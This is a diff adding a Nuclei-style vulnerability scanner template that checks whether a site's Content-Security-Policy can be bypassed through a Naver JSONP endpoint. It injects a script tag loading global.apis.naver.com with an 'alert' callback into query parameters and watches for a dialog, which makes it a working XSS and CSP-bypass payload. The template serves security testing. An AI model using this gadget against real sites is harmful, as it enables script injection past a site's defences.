@@ -1,0 +1,55 @@
+id: naver-global-apis-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Naver Global APIs
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,naver-global-apis
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "naver.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: naver_global_apis_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://global.apis.naver.com/commentBox/cbox/web_neo_list_jsonp.json?_callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "naver_global_apis_csp_xss == true"
+# digest: 490a0046304402202709560688854cb835b432d2992c13d9e3f775d61b7fb00b518ad31bf67037dd022075eeef69e2c511d18e31f9d4d5d2e8364d761c82c7fdde013993036ba94043e1:922c64590222798bb761d5b6d8e72950
